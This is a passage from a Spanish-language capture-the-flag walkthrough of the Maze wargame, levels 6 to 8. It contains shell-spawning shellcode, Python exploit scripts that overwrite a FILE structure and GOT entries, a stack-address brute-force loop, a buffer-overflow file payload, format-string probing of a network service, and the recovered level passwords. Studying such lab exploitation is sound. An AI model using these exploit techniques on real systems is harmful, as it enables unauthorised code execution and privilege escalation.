para saltar a la dirección de una variable de entorno que contenga shellcode para obtener una shell\nPodemos coger un shellcode de 32 bits y guardarlo en una variable de entorno:\nmaze6@maze:/tmp$ export TEST=$(python -c 'print(\"\\x90\" * 20 + \"\\x31\\xc9\\x6a\\x0b\\x58\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xd2\\xcd\\x80\")') maze6@maze:/tmp$ echo $TEST | xxd 00000000: 9090 9090 9090 9090 9090 9090 9090 9090 ................ 00000010: 9090 9090 31c9 6a0b 5851 682f 2f73 6868 ....1.j.XQh//shh 00000020: 2f62 696e 89e3 31d2 cd80 0a /bin..1....  maze6@maze:/tmp$ gdb -q /maze/maze6 Reading symbols from /maze/maze6...done. warning: ~/.gdbinit.local: No such file or directory gdb$ source /usr/local/peda/peda.py gdb-peda$ disassemble main Dump of assembler code for function main: 0x0804855b \u0026lt;+0\u0026gt;: push ebp 0x0804855c \u0026lt;+1\u0026gt;: mov ebp,esp 0x0804855e \u0026lt;+3\u0026gt;: sub esp,0x104 ... 0x08048606 \u0026lt;+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt; 0x0804860b \u0026lt;+176\u0026gt;: add esp,0x10 0x0804860e \u0026lt;+179\u0026gt;: push 0x0 0x08048610 \u0026lt;+181\u0026gt;: call 0x80483f0 \u0026lt;exit@plt\u0026gt; gdb-peda$ break main Breakpoint 1 at 0x8048564: file maze6.c, line 29. gdb-peda$ break *0x8048606 Breakpoint 2 at 0x8048606: file maze6.c, line 40. gdb-peda$ disassemble 0x80483f0 Dump of assembler code for function exit@plt: 0x080483f0 \u0026lt;+0\u0026gt;: jmp DWORD PTR ds:0x80498dc 0x080483f6 \u0026lt;+6\u0026gt;: push 0x18 0x080483fb \u0026lt;+11\u0026gt;: jmp 0x80483b0 End of assembler dump. gdb-peda$ run asdf.txt AAAA Starting program: /maze/maze6 asdf.txt AAAA ... Breakpoint 1, main (argc=0x3, argv=0xffffd644) at maze6.c:29 29 maze6.c: No such file or directory. gdb-peda$ find TEST Searching for 'TEST' in: None ranges Found 2 results, display max 2 items: libc : 0xf7f6fd88 (\"TEST\") [stack] : 0xffffde29 (\"TEST=\", '\\220' \u0026lt;repeats 20 times\u0026gt;, \"\\061\\311j\\vXQh//shh/bin\\211\\343\\061\\322̀\")  Desde la salida anterior de GDB, vemos la dirección de exit en la GOT y la dirección de TEST en la pila. Ahora actualizamos estos valores en el exploit de esta forma:\n#!/usr/bin/env python3 import os import struct exit_got = 0x080498dc env_addr = 0xffffde29 file_addr = 0xffffd3a8 length = 256 p32 = lambda h: struct.pack('\u0026lt;I', h) payload = p32(env_addr + 5) payload += b'\\0' * 28 payload += p32(exit_got - 3) payload += p32(exit_got + 5) payload += b'\\0' * 16 payload += p32(0xf7fc5cc0) payload += b'\\0' * 16 payload += p32(0x0804a0a0) payload += b'\\xff' * 8 payload += b'\\0' * 64 payload += p32(0xf7fc3960) payload += b'\\0' * (length - len(payload)) payload += p32(file_addr) os.write(1, bytes(42 ^ b for b in payload))  La dirección de la estructura FILE ha cambiado, lo cual puede ser comprobado con GDB. Nótese que estamos escribiendo en exit_got porque \u0026quot; : \u0026quot; también se escribirá. De esta manera, podemos escribir 4 bytes desde exit_got hasta exit_got + 4. Además, la dirección que estamos escribiendo es env_addr + 5 porque el contenido comienza en el quinto carácter (TEST=...), aunque hay algunas instrucciones nop como relleno por si acaso.\nAhora si lanzamos el exploit vemos que todo está correcto:\ngdb-peda$ run asdf.txt \"$(python3 maze6.py)\" Starting program: /maze/maze6 asdf.txt \"$(python3 maze6.py)\" [----------------------------------registers-----------------------------------] EAX: 0xffffd69d (\"asdf.txt\") EBX: 0x0 ECX: 0xffffd4a8 --\u0026gt; 0x0 EDX: 0xffffd3a4 --\u0026gt; 0xffffde2e --\u0026gt; 0x90909090 ESI: 0x3 EDI: 0xf7fc5000 --\u0026gt; 0x1b2db0 EBP: 0xffffd4a8 --\u0026gt; 0x0 ESP: 0xffffd394 --\u0026gt; 0xffffd3a8 --\u0026gt; 0x0 EIP: 0x8048606 (\u0026lt;main+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt;) EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80485fd \u0026lt;main+162\u0026gt;: push eax 0x80485fe \u0026lt;main+163\u0026gt;: push 0x80486bf 0x8048603 \u0026lt;main+168\u0026gt;: push DWORD PTR [ebp-0x4] =\u0026gt; 0x8048606 \u0026lt;main+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt; 0x804860b \u0026lt;main+176\u0026gt;: add esp,0x10 0x804860e \u0026lt;main+179\u0026gt;: push 0x0 0x8048610 \u0026lt;main+181\u0026gt;: call 0x80483f0 \u0026lt;exit@plt\u0026gt; 0x8048615: xchg ax,ax Guessed arguments: arg[0]: 0xffffd3a8 --\u0026gt; 0x0 arg[1]: 0x80486bf (\"%s : %s\\n\") arg[2]: 0xffffd69d (\"asdf.txt\") arg[3]: 0xffffd3a4 --\u0026gt; 0xffffde2e --\u0026gt; 0x90909090 [------------------------------------stack-------------------------------------] 0000| 0xffffd394 --\u0026gt; 0xffffd3a8 --\u0026gt; 0x0 0004| 0xffffd398 --\u0026gt; 0x80486bf (\"%s : %s\\n\") 0008| 0xffffd39c --\u0026gt; 0xffffd69d (\"asdf.txt\") 0012| 0xffffd3a0 --\u0026gt; 0xffffd3a4 --\u0026gt; 0xffffde2e --\u0026gt; 0x90909090 0016| 0xffffd3a4 --\u0026gt; 0xffffde2e --\u0026gt; 0x90909090 0020| 0xffffd3a8 --\u0026gt; 0x0 0024| 0xffffd3ac --\u0026gt; 0x0 0028| 0xffffd3b0 --\u0026gt; 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 2, 0x08048606 in main (argc=0x3, argv=0xffffd544) at maze6.c:40 40 in maze6.c gdb-peda$ p *((FILE*) 0xffffd3a8) $2 = { _flags = 0x0, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x80498d9 \"\\224\\351\\367\\366\\203\\004\\bP\\n\\351\\367\\220\\241\\342\\367\u0026\\204\\004\\b\\240\\377\\346\", \u0026lt;incomplete sequence \\367\u0026gt;, _IO_buf_end = 0x80498e1 \"\\n\\351\\367\\220\\241\\342\\367\u0026\\204\\004\\b\\240\\377\\346\", \u0026lt;incomplete sequence \\367\u0026gt;, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0xf7fc5cc0 \u0026lt;_IO_2_1_stderr_\u0026gt;, _fileno = 0x0, _flags2 = 0x0, _old_offset = 0x0, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = \"\", _lock = 0x804a0a0, _offset = 0xffffffffffffffff, __pad1 = 0x0, __pad2 = 0x0, __pad3 = 0x0, __pad4 = 0x0, __pad5 = 0x0, _mode = 0x0, _unused2 = '\\000' \u0026lt;repeats 39 times\u0026gt; }  Y a propósito, si continuamos, obtendremos una shell\ngdb-peda$ continue Continuing. asdf.txtprocess 697 is executing new program: /bin/dash Warning: Cannot insert breakpoint 2. Cannot access memory at address 0x8048606  Ahora el problema es que tenemos que lanzar el exploit sin el depurados. Esto es problemático porque no sabemos de antemano la dirección de la variable de entorno ni la dirección donde se almacenará la estructura FILE en la pila.\nLa dirección de la variable de entorno puede obtenerse utilizando este código:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; void main(int argc, char** argv) { char *ptr; if (argc \u0026lt; 3) { printf(\"Usage: %s \u0026lt;environment variable\u0026gt; \u0026lt;target program name\u0026gt;\\n\", argv[0]); exit(0); } ptr = getenv(argv[1]); /* get env var location */ ptr += (strlen(argv[0]) - strlen(argv[2])) * 2; /* adjust for program name */ printf(\"%s will be at %p\\n\", argv[1], ptr); }  Básicamente, imprime la dirección de una cierta variable de entorno si le indicamos también la ruta de ejecución del binario:\nmaze6@maze:/tmp$ gcc -m32 -o envaddr envaddr.c maze6@maze:/tmp$ export TEST=$(python -c 'print(\"\\x90\" * 20 + \"\\x31\\xc9\\x6a\\x0b\\x58\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xd2\\xcd\\x80\")') maze6@maze:/tmp$ ./envaddr TEST /maze/maze6 TEST will be at 0xffffde35  Y luego, para el problema de la dirección en la pila, podemos hacer fuerza bruta hasta que consigamos la shell:\n#!/usr/bin/env python3 import os import struct import sys exit_got = 0x080498dc env_addr = 0xffffde35 file_addr = 0xffffd000 + int(sys.argv[1]) length = 256 p32 = lambda h: struct.pack('\u0026lt;I', h) payload = p32(env_addr + 10) payload += b'\\0' * 28 payload += p32(exit_got - 3) payload += p32(exit_got + 5) payload += b'\\0' * 16 payload += p32(0xf7fc5cc0) payload += b'\\0' * 16 payload += p32(0x0804a0a0) payload += b'\\xff' * 8 payload += b'\\0' * 64 payload += p32(0xf7fc3960) payload += b'\\0' * (length - len(payload)) payload += p32(file_addr) os.write(1, bytes(42 ^ b for b in payload))  Empezaremos desde 0xffffd000 hasta 0xffffe000 (que es el espacio disponible en la pila) en pasos de 4. Habrá valores en los que la pila se para. Si esto ocurre, cancelamos el bucle y continuamos en la siguiente iteración:\nmaze6@maze:/tmp$ for i in `seq 0 4 4095`; do echo $i; /maze/maze6 asdf.txt \"$(python3 maze6.py $i)\"; done 0 ^C maze6@maze:/tmp$ for i in `seq 4 4 4095`; do echo $i; /maze/maze6 asdf.txt \"$(python3 maze6.py $i)\"; done 4 ^C maze6@maze:/tmp$ for i in `seq 8 4 4095`; do echo $i; /maze/maze6 asdf.txt \"$(python3 maze6.py $i)\"; done 8 Segmentation fault 12 16 ^C  Finalmente, vemos que 952 es el valor correcto y conseguimos una shell como maze7:\nmaze6@maze:/tmp$ for i in `seq 840 4 4095`; do echo $i; /maze/maze6 asdf.txt \"$(python3 maze6.py $i)\"; done 840 Segmentation fault 844 ^C maze6@maze:/tmp$ for i in `seq 848 4 4095`; do echo $i; /maze/maze6 asdf.txt \"$(python3 maze6.py $i)\"; done 848 Fatal error: glibc detected an invalid stdio handle Aborted ... 944 Fatal error: glibc detected an invalid stdio handle Aborted 948 952 asdf.txt$ $ $ whoami maze7  Y funciona perfectamente:\nmaze6@maze:/tmp$ /maze/maze6 asdf.txt \"$(python3 maze6.py 952)\" asdf.txt$ $ whoami maze7 $ cat /etc/maze_pass/maze7 iuvaegoang  Nivel 7 -\u0026gt; 8 Tenemos otro binario que comprueba el contenido de un archivo dado:\nint main(int argc, char **argv) { int __fd; Elf32_Ehdr ehdr; int fd; if (argc \u0026lt; 2) { printf(\"usage: %s file\\n\", *argv); /* WARNING: Subroutine does not return */ exit(1); } __fd = open(argv[1], 0, 0); if (__fd \u0026lt; 0) { printf(\"cannot open file %s\\n\", argv[1]); /* WARNING: Subroutine does not return */ exit(1); } read(__fd, \u0026amp;ehdr, 52); printf(\"Dumping section-headers of program %s\\n\", argv[1]); Print_Shdrs(__fd, ehdr.e_shoff, (uint) ehdr.e_shstrndx, (uint) ehdr.e_shnum, (uint) ehdr.e_shentsize); close(__fd); return 0; }  void Print_Shdrs(int fd, int offset, int shstrndx, int num, size_t size) { void *__buf; void *__buf_00; char sdata[40]; char *strs; Elf32_Shdr *shdr; char *strdata; int i; lseek(fd, offset, 0); __buf = malloc(num * 40); read(fd, __buf, num * 40); lseek(fd, *(__off_t *) ((int) __buf + shstrndx * 40 + 16), 0); __buf_00 = malloc(*(size_t *) ((int) __buf + shstrndx * 40 + 20)); read(fd, __buf_00, *(size_t *) ((int) __buf + shstrndx * 40 + 20)); lseek(fd, offset, 0); puts(\"\\nNo Name\\t\\tAddress\\t\\tSize\"); for (i = 0; i \u0026lt;= num; i++) { read(fd, sdata, size); printf(\"%2d: %-16s\\t0x%08x\\t0x%04x\\n\", i, (int) __buf_00 + sdata._0_4_, sdata._12_4_, sdata._20_4_); } putchar('\\n'); free(__buf_00); free(__buf); return; }  Esta vez, existe una vulnerabilidad de Buffer Overflow en read(fd, sdata, size); dentro de la función Print_Shdrs, ya que sdata tiene 40 bytes asignados y podemos controlar la variable size, que es el número de bytes que serán introducidos en sdata.\nLa variable size viene de ehdr.e_shentsize en la función main. Podemos controlar este campo con el archivo especificado. Vamos a probarlo con GDB:\nmaze7@maze:~$ python3 -c 'print(\"\".join(chr(c) * 4 for c in range(0x41, 0x5b)))' AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ maze7@maze:~$ python3 -c 'print(\"\".join(chr(c) * 4 for c in range(0x41, 0x5b)))' \u0026lt; /tmp/file.txt maze7@maze:~$ xxd /tmp/file.txt 00000000: 4141 4141 4242 4242 4343 4343 4444 4444 AAAABBBBCCCCDDDD 00000010: 4545 4545 4646 4646 4747 4747 4848 4848 EEEEFFFFGGGGHHHH 00000020: 4949 4949 4a4a 4a4a 4b4b 4b4b 4c4c 4c4c IIIIJJJJKKKKLLLL 00000030: 4d4d 4d4d 4e4e 4e4e 4f4f 4f4f 5050 5050 MMMMNNNNOOOOPPPP 00000040: 5151 5151 5252 5252 5353 5353 5454 5454 QQQQRRRRSSSSTTTT 00000050: 5555 5555 5656 5656 5757 5757 5858 5858 UUUUVVVVWWWWXXXX 00000060: 5959 5959 5a5a 5a5a 0a YYYYZZZZ. maze7@maze:~$ gdb -q /maze/maze7 Reading symbols from /maze/maze7...done. (gdb) set pagination off (gdb) disassemble main Dump of assembler code for function main: 0x080486d2 \u0026lt;+0\u0026gt;: push %ebp 0x080486d3 \u0026lt;+1\u0026gt;: mov %esp,%ebp 0x080486d5 \u0026lt;+3\u0026gt;: push %ebx 0x080486d6 \u0026lt;+4\u0026gt;: sub $0x38,%esp 0x080486d9 \u0026lt;+7\u0026gt;: cmpl $0x1,0x8(%ebp) 0x080486dd \u0026lt;+11\u0026gt;: jg 0x80486f9 \u0026lt;main+39\u0026gt; ... 0x08048777 \u0026lt;+165\u0026gt;: pushl -0x8(%ebp) 0x0804877a \u0026lt;+168\u0026gt;: call 0x804859b \u0026lt;Print_Shdrs\u0026gt; 0x0804877f \u0026lt;+173\u0026gt;: add $0x14,%esp 0x08048782 \u0026lt;+176\u0026gt;: pushl -0x8(%ebp) 0x08048785 \u0026lt;+179\u0026gt;: call 0x8048480 \u0026lt;close@plt\u0026gt; 0x0804878a \u0026lt;+184\u0026gt;: add $0x4,%esp 0x0804878d \u0026lt;+187\u0026gt;: mov $0x0,%eax 0x08048792 \u0026lt;+192\u0026gt;: mov -0x4(%ebp),%ebx 0x08048795 \u0026lt;+195\u0026gt;: leave 0x08048796 \u0026lt;+196\u0026gt;: ret End of assembler dump.  Ponemos un breakpoint antes de llamar a Print_Shdrs y miramos los parámetros:\n(gdb) break *0x0804877a Breakpoint 1 at 0x804877a: file maze7.c, line 83. (gdb) run /tmp/file.txt Starting program: /maze/maze7 /tmp/file.txt Dumping section-headers of program /tmp/file.txt Breakpoint 1, 0x0804877a in main (argc=2, argv=0xffffd784) at maze7.c:83 83 maze7.c: No such file or directory. (gdb) x/16x $esp 0xffffd698: 0x00000003 0x49494949 0x00004d4d 0x00004d4d 0xffffd6a8: 0x00004c4c 0x41414141 0x42424242 0x43434343 0xffffd6b8: 0x44444444 0x45454545 0x46464646 0x47474747 0xffffd6c8: 0x48484848 0x49494949 0x4a4a4a4a 0x4b4b4b4b  Nos preocupa el quinto parámetro, que es 0x00004c4c esta vez (donde tenemos LLLL en el archivo).\nPonemos otro breakpoint en la instrucción read vulnerable y vemos que alcanza el breakpoint:\n(gdb) disassemble Print_Shdrs Dump of assembler code for function Print_Shdrs: 0x0804859b \u0026lt;+0\u0026gt;: push %ebp 0x0804859c \u0026lt;+1\u0026gt;: mov %esp,%ebp 0x0804859e \u0026lt;+3\u0026gt;: push %ebx 0x0804859f \u0026lt;+4\u0026gt;: sub $0x38,%esp 0x080485a2 \u0026lt;+7\u0026gt;: push $0x0 0x080485a4 \u0026lt;+9\u0026gt;: pushl 0xc(%ebp) 0x080485a7 \u0026lt;+12\u0026gt;: pushl 0x8(%ebp) 0x080485aa \u0026lt;+15\u0026gt;: call 0x8048410 \u0026lt;lseek@plt\u0026gt; 0x0804864e \u0026lt;+179\u0026gt;: call 0x8048430 \u0026lt;puts@plt\u0026gt; 0x08048653 \u0026lt;+184\u0026gt;: add $0x4,%esp 0x08048656 \u0026lt;+187\u0026gt;: movl $0x0,-0x8(%ebp) 0x0804865d \u0026lt;+194\u0026gt;: jmp 0x80486a4 \u0026lt;Print_Shdrs+265\u0026gt; 0x0804865f \u0026lt;+196\u0026gt;: pushl 0x18(%ebp) 0x08048662 \u0026lt;+199\u0026gt;: lea -0x3c(%ebp),%eax 0x08048665 \u0026lt;+202\u0026gt;: push %eax 0x08048666 \u0026lt;+203\u0026gt;: pushl 0x8(%ebp) 0x08048669 \u0026lt;+206\u0026gt;: call 0x80483e0 \u0026lt;read@plt\u0026gt; 0x0804866e \u0026lt;+211\u0026gt;: add $0xc,%esp 0x08048671 \u0026lt;+214\u0026gt;: lea -0x3c(%ebp),%eax 0x080486c4 \u0026lt;+297\u0026gt;: call 0x8048400 \u0026lt;free@plt\u0026gt; 0x080486c9 \u0026lt;+302\u0026gt;: add $0x4,%esp 0x080486cc \u0026lt;+305\u0026gt;: nop 0x080486cd \u0026lt;+306\u0026gt;: mov -0x4(%ebp),%ebx 0x080486d0 \u0026lt;+309\u0026gt;: leave 0x080486d1 \u0026lt;+310\u0026gt;: ret End of assembler dump. (gdb) break *0x08048669 Breakpoint 2 at 0x8048669: file maze7.c, line 51. (gdb) continue Continuing. No Name Address Size Breakpoint 2, 0x08048669 in Print_Shdrs (fd=3, offset=1229539657, shstrndx=19789, num=19789, size=19532) at maze7.c:51 51 in maze7.c (gdb) continue Continuing. Program received signal SIGSEGV, Segmentation fault. 0xf7e87ce1 in ?? () from /lib32/libc.so.6 (gdb) quit  El programa se rompe porque debido a los argumentos que le pasamos a Print_Shdrs. Vamos a llenar el archivo con bytes nulos hasta la posición donde controlamos size:\nmaze7@maze:~$ python3 -c 'print(\"\\0\" * 44 + \"ABCD\" + \"\\0\" * 40)' \u0026lt; /tmp/file.txt maze7@maze:~$ xxd /tmp/file.txt 00000000: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000010: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000020: 0000 0000 0000 0000 0000 0000 4142 4344 ............ABCD 00000030: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000040: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000050: 0000 0000 0000 0000 0a ......... maze7@maze:~$ gdb -q /maze/maze7 Reading symbols from /maze/maze7...done. (gdb) break *0x0804877a Breakpoint 1 at 0x804877a: file maze7.c, line 83. (gdb) run /tmp/file.txt Starting program: /maze/maze7 /tmp/file.txt Dumping section-headers of program /tmp/file.txt Breakpoint 1, 0x0804877a in main (argc=2, argv=0xffffd784) at maze7.c:83 83 maze7.c: No such file or directory. (gdb) x/16x $esp 0xffffd698: 0x00000003 0x00000000 0x00000000 0x00000000 0xffffd6a8: 0x00004443 0x00000000 0x00000000 0x00000000 0xffffd6b8: 0x00000000 0x00000000 0x00000000 0x00000000 0xffffd6c8: 0x00000000 0x00000000 0x00000000 0x00000000  Sabemos que podemos controlar dos bytes (0x00004443, CD) que serán copiados a size. Ahora, vamos a añadir algo más reconocible después de CD:\nmaze7@maze:~$ python3 -c 'print(\"\\0\" * 44 + \"ABCD\" + \"\".join(chr(c) * 4 for c in range(0x41, 0x46)))' \u0026lt; /tmp/file.txt maze7@maze:~$ xxd /tmp/file.txt 00000000: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000010: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000020: 0000 0000 0000 0000 0000 0000 4142 4344 ............ABCD 00000030: 4141 4141 4242 4242 4343 4343 4444 4444 AAAABBBBCCCCDDDD 00000040: 4545 4545 0a EEEE. maze7@maze:~$ gdb -q /maze/maze7 Reading symbols from /maze/maze7...done. (gdb) break *0x08048669 Breakpoint 1 at 0x8048669: file maze7.c, line 51. (gdb) run /tmp/file.txt Starting program: /maze/maze7 /tmp/file.txt Dumping section-headers of program /tmp/file.txt No Name Address Size Breakpoint 1, 0x08048669 in Print_Shdrs (fd=3, offset=0, shstrndx=16705, num=16705, size=17475) at maze7.c:51 51 maze7.c: No such file or directory. (gdb) c Continuing. 1111638594: (null) 0x00000000 0x0000 Program received signal SIGSEGV, Segmentation fault. 0xf7e84016 in free () from /lib32/libc.so.6 (gdb) info registers eax 0x0 0 ecx 0x41414141 1094795585 edx 0x41414139 1094795577 ebx 0xf7fc5000 -134459392 esp 0xffffd640 0xffffd640 ebp 0xffffd690 0xffffd690 esi 0x2 2 edi 0xf7fc5000 -134459392 eip 0xf7e84016 0xf7e84016 \u0026lt;free+38\u0026gt; eflags 0x10206 [ PF IF RF ] cs 0x23 35 ss 0x2b 43 ds 0x2b 43 es 0x2b 43 fs 0x0 0 gs 0x63 99 (gdb) quit  Ahora que vuelve a romperse, vemos que $ecx tiene 0x41414141 (AAAA) como valor. Vamos a añadir más bytes nulos entre ABCD y AAAA y veamos qué pasa:\nmaze7@maze:~$ python3 -c 'print(\"\\0\" * 44 + \"ABCD\" + \"\\0\" * 4 + \"\".join(chr(c) * 4 for c in range(0x41, 0x45)))' \u0026lt; /tmp/file.txt maze7@maze:~$ xxd /tmp/file.txt 00000000: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000010: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000020: 0000 0000 0000 0000 0000 0000 4142 4344 ............ABCD 00000030: 0000 0000 4141 4141 4242 4242 4343 4343 ....AAAABBBBCCCC 00000040: 4444 4444 0a DDDD. maze7@maze:~$ gdb -q /maze/maze7 Reading symbols from /maze/maze7...done. (gdb) break *0x08048669 Breakpoint 1 at 0x8048669: file maze7.c, line 51. (gdb) run /tmp/file.txt Starting program: /maze/maze7 /tmp/file.txt Dumping section-headers of program /tmp/file.txt No Name Address Size Breakpoint 1, 0x08048669 in Print_Shdrs (fd=3, offset=0, shstrndx=0, num=0, size=17475) at maze7.c:51 51 maze7.c: No such file or directory. (gdb) c Continuing. 1094795585: (null) 0x00000000 0x0000 Program received signal SIGSEGV, Segmentation fault. 0x44444444 in ?? () (gdb) quit  Genial, ahora tenemos el control de $eip (0x44444444, DDDD). Ahora, es el momento de ejecutar shellcode. La manera más sencilla es saltar a una variable de entorno cargada en la pila, como en niveles anteriores. Podemos utilizar el programa envaddr de antes para saber la dirección donde estará la variable:\nmaze7@maze:/tmp$ export TEST=$(python3 -c 'import os; os.write(1, b\"\\x90\" * 200 + b\"\\x31\\xc9\\x6a\\x0b\\x58\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xd2\\xcd\\x80\")') maze7@maze:/tmp$ ./envaddr TEST /maze/maze7 TEST will be at 0xffffde0f  Ahora creamos el archivo (añadiendo algún offset a la dirección de la pila para caer en la zona de instrucciones nop) y listo:\nmaze7@maze:/tmp$ python3 -c 'import os; os.write(1, b\"\\0\" * 44 + b\"ABCD\" + b\"\\0\" * 16 + b\"\\x20\\xde\\xff\\xff\")' \u0026gt; /tmp/file.txt maze7@maze:/tmp$ /maze/maze7 /tmp/file.txt Dumping section-headers of program /tmp/file.txt No Name Address Size 0: (null) 0x00000000 0x0000 $ whoami maze8 $ cat /etc/maze_pass/maze8 pohninieng  Nivel 8 -\u0026gt; 9 Esta vez, el binario /maze/maze8 ejecutará un programa que escucha en un puerto dado (1337 por defecto) y espera una contraseña:\nint main(int argc, char **argv) { int iVar1; int iVar2; __pid_t _Var3; size_t sVar4; ssize_t sVar5; char replybuf[532]; char buf[512]; int sopt; sockaddr_in serv; int bytes; int client_sock; int serv_sock; char *answer; char *question; int port; answer = \"god\"; port._0_2_ = 1337; if (argc == 2) { iVar1 = atoi(argv[1]); port._0_2_ = (uint16_t) iVar1; } iVar1 = socket(2, 1, 6); if (iVar1 == -1) { perror(\"socket()\"); /* WARNING: Subroutine does not return */ exit(1); } setsockopt(iVar1, 1, 2, \u0026amp;sopt, 4); serv.sin_family = 2; serv.sin_port = htons((uint16_t) port); serv.sin_addr = 0; memset(serv.sin_zero, 0, 8); iVar2 = bind(iVar1, (sockaddr *) \u0026amp;serv, 0x10); if (iVar2 == -1) { perror(\"bind()\"); /* WARNING: Subroutine does not return */ exit(1); } iVar2 = listen(iVar1, 5); if (iVar2 == -1) { perror(\"listen()\"); /* WARNING: Subroutine does not return */ exit(1); } alarm(0x4b0); signal(0xe, alrm); signal(0x11, (__sighandler_t) 0x1); while( true ) { client_sock = accept(iVar1, (sockaddr *) 0x0, (socklen_t *) 0x0); _Var3 = fork(); if (_Var3 == 0) break; close(client_sock); } sVar4 = strlen(\"Give the correct password to proceed: \"); send(client_sock, \"Give the correct password to proceed: \", sVar4, 0); sVar5 = recv(client_sock,buf, 0x1ff, 0); buf[sVar5] = '\\0'; iVar1 = strcmp(answer, buf); if (iVar1 == 0) { replybuf._0_4_ = 0x2e727245; replybuf._4_4_ = 0x49202e2e; replybuf._8_4_ = 0x73617720; replybuf._12_4_ = 0x73756a20; replybuf._16_4_ = 0x6f6a2074; replybuf._20_4_ = 0x676e696b; replybuf._24_4_ = 0x202e2e2e; replybuf._28_4_ = 0x2c736579; replybuf._32_4_ = 0x206f6720; replybuf._36_4_ = 0x79617761; replybuf._40_2_ = 0xa2e; replybuf[42] = '\\0'; } else { snprintf(replybuf, 0x200, buf); sVar4 = strlen(replybuf); *(undefined4 *)(replybuf + (sVar4 - 1)) = 0x20736920; *(undefined4 *)(replybuf + sVar4 + 3) = 0x6e6f7277; *(undefined4 *)(replybuf + sVar4 + 7) = 0x5f5e2067; *(undefined2 *)(replybuf + sVar4 + 0xb) = 0xa5e; replybuf[sVar4 + 0xd] = '\\0'; } sVar4 = strlen(replybuf); send(client_sock, replybuf, sVar4, 0); /* WARNING: Subroutine does not return */ _exit(0); }  Podemos iniciar el servidor en una sesión e interactuar desde otra:\nmaze8@maze:~$ /maze/maze8  Aunque la contraseña está escrita en el binario, el servidor siempre dice que está mal:\nmaze8@maze:~$ nc 127.0.0.1 1337 Give the correct password to proceed: god god is wrong ^_^ maze8@maze:~$ nc 127.0.0.1 1337 Give the correct password to proceed: asdf asdf is wrong ^_^  El programa está llamando a snprintf utilizando una variable controlada por el usuario (buf) como format string. Por tanto, existe una vulnerabilidad de Format String. Podemos comprobarlo de esta manera:\nmaze8@maze:~$ nc 127.0.0.1 1337 Give the correct password to proceed: %x.%x.%x.%x.%x.%x.%x.%x.%x 3de00e00.30306530.3330332e.33353630.33332e30.33333033.332e6532.33353333.2e303336 is wrong ^_^  Esta vulnerabilidad permite leer valores arbitrario de la memoria, pero también escribir valores arbitrarios.\nEn primer lugar, tenemos que descubrir la posición en la pila donde nuestra entrada se está almacenando. Esto puede realizarse poniendo algunos caracteres reconocibles antes de los formatos %x (formato que muestra los datos en hexadecimal):\nmaze8@maze:~$ nc 127.0.0.1 1337 Give the correct password to proceed: AAAA %x.%x.%x.%x.%x.%x.%x AAAA 41414141.34313420.34313431.34332e31.34333133.332e3032.33313334 is wrong ^_^  Y vemos que el primer %x imprime 41414141 (que es AAAA en hexadecimal). Por tanto, lo que pongamos en los primeros 4 bytes estarán en la posición 1 de la pila. Podemos verificarlo así:\nmaze8@maze:~$ nc 127.0.0.1 1337 Give the correct password to proceed: AAAA %1$x AAAA 41414141 is wrong ^_^  Y además, si añadimos más datos, podemos utilizar %2$x para tener más valores:\nmaze8@maze:~$ nc 127.0.0.1 1337 Give the correct password to proceed: AAAABBBB %1$x %2$x AAAABBBB 41414141 42424242 is wrong ^_^  Ahora es el momento de introducir el formato %n. Este permite escribir el número de caracteres imprimidos hasta el formato %n en la dirección de la variable a la que apunta.\nPor ejemplo, si pusiéramos AAAA %1$n, el programa guardaría 0x00000005 en la dirección 0x41414141. Pero esto es solo un ejemplo, la idea ahora es sobrescribir una entrada de la Tabla de Offsets Globales para que apunte a shellcode malicioso.\nDespués de snprintf el programa llama a strlen y _exit. Podemos sobreescribir cualquiera de ellos, pero utilizaré _exit esta vez. La dirección de _exit en la GOT es la siguiente:\nmaze8@maze:~$ objdump -R /maze/maze8 | grep _exit 08049d18 R_386_JUMP_SLOT _exit@GLIBC_2.0  Ahora la idea es poner 0x08049d18 (en formato little-endian) donde teníamos las AAAA en el ejemplo y poner un valor en esta dirección utilizando %n. Para probarlo, ejecutamos el servidor con GDB. Será útil poner un breakpoint después de snprintf:\nmaze8@maze:~$ gdb -q /maze/maze8 Reading symbols from /maze/maze8...done. (gdb) source /usr/local/peda/peda.py gdb-peda$ disassemble main Dump of assembler code for function main: 0x08048795 \u0026lt;+0\u0026gt;: push ebp 0x08048796 \u0026lt;+1\u0026gt;: mov ebp,esp 0x08048798 \u0026lt;+3\u0026gt;: sub esp,0x440 ... 0x0804899d \u0026lt;+520\u0026gt;: call 0x8048600 \u0026lt;snprintf@plt\u0026gt; 0x080489a2 \u0026lt;+525\u0026gt;: add esp,0xc 0x080489a5 \u0026lt;+528\u0026gt;: lea eax,[ebp-0x440] 0x080489ab \u0026lt;+534\u0026gt;: push eax 0x080489ac \u0026lt;+535\u0026gt;: call 